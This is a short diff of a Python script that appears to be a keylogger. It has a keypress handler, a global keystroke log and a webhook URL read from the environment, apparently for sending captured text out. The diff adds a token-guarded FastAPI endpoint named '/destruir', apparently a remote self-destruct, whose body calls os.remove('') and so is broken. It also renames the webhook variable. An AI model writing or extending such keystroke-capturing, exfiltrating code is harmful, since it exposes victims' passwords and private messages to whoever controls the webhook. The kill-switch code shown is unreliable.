@@ -4,13 +4,25 @@ import requests
 from dotenv import load_dotenv
 import os
 from threading import Thread
+from fastapi import FastAPI, HTTPException
+
+app = FastAPI()
+
+secret_token = os.getenv('SECRET_TOKEN')
+
+@app.post('/destruir')
+def destruir(token: str):
+    if token != secret_token:
+        raise HTTPException(status_code=403, detail='ACESSO NEGADO MEU PATRÃO RSRS')
+
+    os.remove('')    
 
 load_dotenv()
 
 fullog = ''
 words = ''
 
-url = os.getenv('webhook_url')
+url = os.getenv('webhook_url_mv')
 
 def onPress(key):
     global fullog
